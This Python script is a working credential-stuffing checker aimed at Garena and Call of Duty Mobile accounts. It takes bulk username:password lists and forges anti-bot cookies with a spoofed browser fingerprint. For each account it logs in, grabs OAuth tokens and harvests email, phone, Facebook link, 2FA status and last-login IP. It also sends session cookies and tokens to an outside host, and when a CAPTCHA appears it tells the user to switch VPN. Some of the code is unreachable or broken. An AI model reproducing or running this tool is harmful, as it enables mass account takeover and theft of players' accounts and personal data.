import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES
import change_cookie
init(autoreset=True)

RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"  
GREEN = "\033[32m"       
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"


datenok = str(int(time.time()))

def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)    

def get_datenow():
    return datenok
def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]  # Return a hex string of the first 32 bytes
def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    return encrypted_password
def get_datadome_cookie():
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            print(f"Response content: {response.text[:200]}...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting DataDome cookie: {e}")
        return None

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date):
    cookies["datadome"] = dataa
    login_params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }
    login_url = apkrov + f"{urlencode(login_params)}"
    
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print("[🔴] ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇʀʀᴏʀ – sᴇʀᴠᴇʀ ʀᴇғᴜsᴇᴅ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ")
        return "FAILED"
    except requests.exceptions.ReadTimeout:
        print("[⏱️] Timeout - Server is taking too long to respond")
        return "FAILED"
    except requests.RequestException as e:
        print(f"[⚠️] ʟᴏɢɪɴ ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ: {e}")
        return "FAILED"
    try:
        login_json_response = response.json()
    except json.JSONDecodeError:
        print(f"[💢] ʟᴏɢɪɴ ғᴀɪʟᴇᴅ: ɪɴᴠᴀʟɪᴅ ᴊsᴏɴ ʀᴇsᴘᴏɴsᴇ. sᴇʀᴠᴇʀ ʀᴇsᴘᴏɴsᴇ: {response.text}")
        return "FAILED"

    if 'error_auth' in login_json_response:
        return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    
    if 'error_params' in login_json_response:
        return "[📝] ɪɴᴠᴀʟɪᴅ ᴘᴀʀᴀᴍᴇᴛᴇʀs"
    
    if 'error' in login_json_response:
        return f"[🚫] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    
    if not login_json_response.get('success', True):
        return "[🔴] ʟᴏɢɪɴ ғᴀɪʟᴇᴅ"    
   
    session_key = login_json_response.get('session_key', '')
    take = cookies["datadome"]
    if not session_key:
        return "[FAILED] No session key"
#    print("LOGIN SUCCESSFULL")
    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''       
    coke = change_cookie.get_cookies()
    coke["ac_session"] = "7tdtotax7wqldao9chxtp30tn4m3ggkr"
    coke["datadome"] = take
    coke["sso_key"] = sso_key

    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    init_url = 'https://suneoxjarell.x10.bz/jajak.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})

    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
    except requests.RequestException as e:
        return f"[ERROR] Init Request Failed: {e}"

    try:
        init_json_response = json.loads(init_response.text)
    except json.JSONDecodeError:
        return "[ERROR] Failed to parse JSON response from server."

    if 'error' in init_json_response or not init_json_response.get('success', True):
        return f"[ERROR] {init_json_response.get('error', 'Unknown error')}"

    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status')  # Get status from response

    account_status = init_json_response.get('status', 'Unknown')
    country = "N/A"
    last_login = "N/A"
    last_login_where = "N/A"
    avatar_url = "N/A"
    fb = "N/A"
    eta = "N/A"
    fbl = "N/A"
    mobile = "N/A"
    facebook = "False"
    shell = "0"
    count = "UNKNOWN"
    ipk = "1.1.1.1"    
    region = "IN.TH"
    email = "N/A"
    ipc = "N/A"
    mb = "mb"
    tae = "GS1.1.1741519354.3.0.1741519361.0.0.0"
    mspid2 = "2990f10cf751cf937dcb2b257767d582"
    email_verified = "False"
    authenticator_enabled = False
    two_step_enabled = False

    for binding in bindings:
        if "Country:" in binding:
            country = binding.split("Country:")[-1].strip()
        elif "LastLogin:" in binding:
            last_login = binding.split("LastLogin:")[-1].strip()       
        elif "LastLoginFrom:" in binding:
            last_login_where = binding.split("LastLoginFrom:")[-1].strip()            
        elif "ckz:" in binding:
            count = binding.split("ckz:")[-1].strip()       
        elif "LastLoginIP:" in binding:
            ipk = binding.split("LastLoginIP:")[-1].strip()                                      
        elif "Las:" in binding:
            ipc = binding.split("Las:")[-1].strip()                                    
        elif "Garena Shells:" in binding:
            shell = binding.split("Garena Shells:")[-1].strip()
        elif "Facebook Account:" in binding:
            fb = binding.split("Facebook Account:")[-1].strip()
            facebook = "True"
        elif "Fb link:" in binding:
            fbl = binding.split("Fb link:")[-1].strip()
        elif "Avatar:" in binding:
            avatar_url = binding.split("Avatar:")[-1].strip()
        elif "Mobile Number:" in binding:
            mobile = binding.split("Mobile Number:")[-1].strip()                  
        elif "tae:" in binding:
            email_verified = "True" if "Yes" in binding else "False"
        elif "eta:" in binding:
            email = binding.split("eta:")[-1].strip()
        elif "Authenticator:" in binding:
            authenticator_enabled = "True" if "Enabled" in binding else "False"
        elif "Two-Step Verification:" in binding:
            two_step_enabled = "True" if "Enabled" in binding else "False"

#    print("BIND CHECK SUCCESS")
    cookies["sso_key"] = sso_key            
    head = {
    "Host": "auth.garena.com",
    "Connection": "keep-alive",
    "Content-Length": "107",
    "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": selected_header["sec-ch-ua-platform"],
    "sec-ch-ua-mobile": "?1",
    "User-Agent": selected_header["User-Agent"],
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Origin": "https://auth.garena.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9"
    }               
    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }            
    try:     
        grant_url = "https://auth.garena.com/oauth/token/grant"        
        reso = requests.post(grant_url, headers=head, data=data, cookies=cookies)   
        if not reso:
            return "[FAILED] No response from server."       
        try:
            data = reso.json()
        except ValueError:
            return "Failed to parse response as JSON."                    
        if "error" in data:            
            return f"[FAILED] {data['error']}"
        else:
        
            if "access_token" in data:
 #               print("token yes")

                newdate = get_datadome_cookie()
                
                token_session = reso.cookies.get('token_session', cookies.get('token_session'))                                               
                access_token = data["access_token"]
                tae = show_level(access_token, selected_header,sso_key,token_session, newdate, cookies)                    
                if "[😵‍💫]" in tae:
                    return tae + "FAILED, UNKNOWN ERROR"
                
                codm_nickname, codm_level, codm_region, uid = tae.split("|")
   

                connected_games = []

                if not (uid and codm_nickname and codm_level and codm_region):
                    connected_games.append("No CODM account found")
                else:
                    connected_games.append(f"[📊] Account Level: {codm_level}\n[🕹️] Game: CODM ({codm_region})\n[🏷️] Nickname: {codm_nickname}\n[🆔] UID: {uid}")
                
                
                if is_clean == "\033[0;32m\033[1mClean\033[0m":
                    is_clean = True
                else:
                    is_clean = False 
                    
                passed = format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, fbl, email, date, account_username, password, count, ipk, ipc)    
                return passed                                                                                                                              
            else:
                return f"[FAILED] 'access_token' not found in response {data}"               
    except requests.RequestException as e:
        return f"[FAILED] {e}"


def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"]
    }
    newdate = get_datadome_cookie()
    
    cookie.update({
        "datadome": newdate,
        "sso_key": sso,
        "token_session": token
    })

    response = requests.get(url, headers=headers, cookies=cookie, params=params)

    if response.status_code == 200:
        parsed_url = urlparse(response.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]

        data = {
        "selected_header": selected_header,
        "extracted_token": extracted_token
        }
    
    #    print(json.dumps(data, indent=4))  # Print JSON data for debugging

        try:
            response = requests.post(
                "https://suneoxjarell.x10.bz/jajac.php",
                json=data,
                headers={"Content-Type": "application/json"}
            )
        
         #   print(f"Response Code: {response.status_code}")
      #      print(f"Response Text: {response.text}")

            if response.status_code == 200:
                return response.text
            else:
                return f"[FAILED] {response.status_code} - {response.text}"
    
        except requests.exceptions.RequestException as e:
            return f"[FAILED] {str(e)}"
    else:
        return f"[FAILED] {response.text}"


import html

def format_result(
    last_login, last_login_where, country, shell, avatar_url, mobile,
    facebook, email_verified, authenticator_enabled, two_step_enabled,
    connected_games, is_clean, fb, fbl, email, date, username, password,
    count, ipk, ipc
):
    clean_status = "Clean" if is_clean else "Not Clean"
    fbl = "N/A" if fb == "N/A" else fbl
    email_ver = "Not Verified" if email_verified == "False" else "Verified"
    avatar_urls = html.escape(avatar_url)

    account_info = [
        "<b>Account Info:</b>",
        f"👤 User:\n<code>{username}</code>",
        f"🔑 Pass:\n<code>{password}</code>",
        f"📅 Last Login: <code>{last_login}</code>",
        f"🌐 From: <code>{last_login_where}</code>",
        f"🔍 IP: <code>{ipk}</code>",
        f"🗺️ Country (login): <code>{ipc}</code>",
        f"🏳️ Region: <b>{country}</b>",
        f"🐚 Shells: <b>{shell}</b>",
        f"🖼️ Avatar: <a href=\"{avatar_urls}\">[View Avatar]</a>",
        f"📱 Mobile: <b>{mobile}</b>",
        f"📧 Email: <b>{email}</b> ({email_ver})",
        f"👤 Facebook: <b>{fb}</b>",
        f"🔗 FB Link: <a href=\"{fbl}\">{fbl}</a>" if fbl != "N/A" else "🔗 FB Link: N/A",
    ]

    codm_info = connected_games if connected_games else ["No Games Found"]
    codm_info = [f"🎮 {html.escape(game)}" for game in codm_info]

    bind_status = [
        "<b>Bind Status:</b>",
        f"📱 Mobile binded: <b>{mobile != 'N/A'}</b>",
        f"✅ Email verified: <b>{email_verified}</b>",
        f"🔗 Facebook Linked: <b>{facebook}</b>",
        f"🔐 Authenticator: <b>{authenticator_enabled}</b>",
        f"🛡️ 2FA: <b>{two_step_enabled}</b>",
    ]

    status = f"<b>Account Status:</b>\n⚙️ <b>{clean_status}</b>"
    footer = "🛠️ Checker powered by: <b>Aki's bot</b>"

    msg = "\n\n".join([
        "<b>✅ LOGIN SUCCESSFUL</b>",
        "\n".join(account_info),
        "<b>CODM Info:</b>",
        "\n".join(codm_info),
        "\n".join(bind_status),
        status,
        footer
    ])

    return msg

    output_dir = "output"   

    os.makedirs(output_dir, exist_ok=True)

    clean_file = os.path.join(output_dir, f"clean_{date}.txt")
    notclean_file = os.path.join(output_dir, f"notclean_{date}.txt")

    file_to_save = clean_file if is_clean else notclean_file
    resalt = strip_ansi_codes_jarell(mess)
    with open(file_to_save, "a", encoding="utf-8") as f:
        f.write(resalt + "\n" + "-" * 50 + "\n")
        
    return mess
def get_request_data():
    cookies = change_cookie.get_cookies()
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',  # Changed to match captured request
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    return cookies, headers

def check_account(username, password, date):
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        cookies, headers = get_request_data()
        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        login_url = "https://auth.garena.com/api/prelogin"
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers)

        if "captcha" in response.text.lower():
            print(f"{RED}[🔴 𝐒𝐓𝐎𝐏] CAPTCHA detected. Please change your VPN or IP and enter again.{RESET}")
            input("🆘 ᴘʟᴇᴀsᴇ ᴄʜᴀɴɢᴇ ʏᴏᴜʀ ᴠᴘɴ ᴏʀ ɪᴘ ᴀɴᴅ ᴘʀᴇss ᴇɴᴛᴇʀ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ...")
            return "[🔴 𝐒𝐓𝐎𝐏] ᴄᴀᴘᴛᴄʜᴀ ᴅᴇᴛᴇᴄᴛᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ."

        if response.status_code == 200:
            data = response.json()
            v1 = data.get('v1')
            v2 = data.get('v2')
            prelogin_id = data.get('id')

            if not all([v1, v2, prelogin_id]):
                return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"

            new_datadome = response.cookies.get('datadome', cookies.get('datadome'))
            encrypted_password = getpass(password, v1, v2)

            if not new_datadome:
                return "[FAILED] Status: Missing updated cookies"

            if "error" in data or data.get("error_code"):
                return f"[FAILED] Status: {data.get('error', 'Unknown error')}"

            # Assuming check_login returns a string with status messages
            tre = check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)
            if "✅ LOGIN SUCCESSFUL" in tre or "[✅]" in tre:
                return "SUCCESS", tre
            else:
                return "FAILED", tre
        else:
            return f"[FAILED] HTTP Status: {response.status_code}"

    except Exception as e:
        return f"[FAILED] {e}"
def bulk_check(file_path):
    successful_count = 0
    failed_count = 0
    checked_count = 0
    date = get_datenow()

    if not file_path.endswith('.txt'):
        print("🔴: Invalid file format. Please provide a .txt file.")
        return    

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)  

    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    success_file = os.path.join(output_dir, f"valid_{date}.txt")

    print(f"\n{Fore.GREEN}⚙️ Processing: {file_path}{Style.RESET_ALL}")

    try:
        # First pass: Filter valid accounts
        valid_accounts = []
        with open(file_path, 'r', encoding='utf-8') as infile:
            for line in infile:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        valid_accounts.append((parts[0].strip(), parts[1].strip()))

        total_accounts = len(valid_accounts)
        print(f"{Fore.CYAN}📊 Total valid accounts: {total_accounts}{Style.RESET_ALL}\n")

        # Second pass: Process accounts
        with open(failed_file, 'a', encoding='utf-8') as failed_out, \
             open(success_file, 'a', encoding='utf-8') as success_out:

            for username, password in valid_accounts:
                checked_count += 1
                print(f"\r{Fore.YELLOW}🔍 Checking: {checked_count}/{total_accounts} | Failed: {failed_count} | Success: {successful_count} {Style.RESET_ALL}", end="", flush=True)
                
                result = check_account(username, password, date)
                
                if "[✅]" in result:
                    successful_count += 1
                    success_out.write(f"{username}:{password}\n")
                    print(f"\n{Fore.GREEN}✅ SUCCESS: {username}:{password}\n{result}{Style.RESET_ALL}")
                else:
                    failed_count += 1
                    failed_out.write(f"{username}:{password} | {result}\n")
                    print(f"\n{Fore.RED}❌ FAILED:{username}:{password}\n{result}{Style.RESET_ALL}")

    except Exception as e:
        print(f"\n{Fore.RED}⚠ ERROR: {e}{Style.RESET_ALL}")
    finally:
        print(f"\n{Fore.GREEN}📊 Final Results:")
        print(f"✔ Checked: {checked_count}/{total_accounts}")
        print(f"✔ Success: {successful_count}")
        print(f"✖ Failed: {failed_count}")
        print(f"\n💾 Saved to:")
        print(f"- Success: {success_file}")
        print(f"- Failed: {failed_file}{Style.RESET_ALL}")
    try:
        response = requests.get(url)
        response_text = response.text
        return response_text.strip()
    except requests.RequestException:
        return "NoNet"
        
    return False

